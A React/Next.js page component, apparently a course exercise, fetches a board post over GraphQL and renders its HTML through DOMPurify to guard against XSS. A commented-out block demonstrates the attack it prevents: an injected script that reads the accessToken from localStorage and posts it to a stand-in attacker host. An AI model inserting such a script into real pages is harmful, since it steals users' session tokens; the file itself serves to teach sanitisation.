import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";
const FETCH_BOARD = gql`
  query fetchBoard($boardId: Id!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;

export default function StaticRouringMovedPage(): JSX.Element {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.qqq },
  });

  return (
    <>
      <div style={{ color: "black" }}>writer: {data?.fetchBoard?.writer}</div>
      <div style={{ color: "green" }}>title: {data?.fetchBoard?.title}</div>
      {/* <div>content: {data?.fetchBoard?.content}</div> */}
      {/*  <div
        dangerouslySetInnerHTML={{
          __html: `
          <script>
            const qqq = localStorage.getItem("accessToken")
            axios.post("http://myhackerbackend.com/mydata", {data: qqq})
          </script>`,
        }} 
      /> */}
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
          }}
        />
      ) : (
        <div style={{ color: "blue" }} />
      )}
      <div style={{ color: "brown" }}>주소: 구로구</div>
    </>
  );
}
